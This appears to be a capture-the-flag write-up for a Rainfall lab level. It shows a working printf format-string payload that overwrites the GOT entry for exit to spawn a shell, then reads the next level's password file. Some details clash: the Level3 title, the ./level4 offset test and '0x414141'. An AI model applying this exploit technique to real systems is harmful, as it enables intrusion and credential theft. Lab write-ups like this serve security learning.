@@ -1,0 +1,54 @@
+# Rainfall - Level3 Walkthrough
+
+We copy the file `/home/user/level5/level5` locally:
+
+```bash
+scp -P 4242 level5@{IP}:/home/user/level5/level5 .
+```
+
+**Step 1**
+Open the binary in Ghidra.
+
+**Step 2**
+Looking at the code, we understand that we need to find a way to execute the `o` function which would result in a shell execution.
+
+We previously learned that we can control printf to write a choosen value in a pointer of our choice.
+
+We want to overwrite the pointer to the exit function to point to the function `o`.
+
+**Step 3**
+We search for the address of exit:
+```bash
+gdb ./level5
+disas exit
+```
+
+> Dump of assembler code for function exit@plt:
+>   0x080483d0 <+0>:	jmp    *0x8049838
+>   0x080483d6 <+6>:	push   $0x28
+>   0x080483db <+11>:	jmp    0x8048370
+
+The address of `exit` we want to overwrite is `0x8049838`
+The little endian version is \x38\x98\x04\x08
+
+The addres of `o` is `0x080484a4`.
+That gives 134513828 in decimal
+The padding is 134513828 - 4 = 134513824
+
+The offset in the format string:
+
+```bash
+./level4
+AAAA %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
+```
+0x414141 (=AAAA) is found at the 4th position.
+
+**Step 4**
+We craft a the payload (exit_address_little_endian + padding_to_o_address + %4$n).
+
+```bash
+(python -c "print '\x38\x98\x04\x08' + '%134513824c' + '%4\$n'"; cat) | ./level5
+cat /home/user/level6/.pass
+```
+
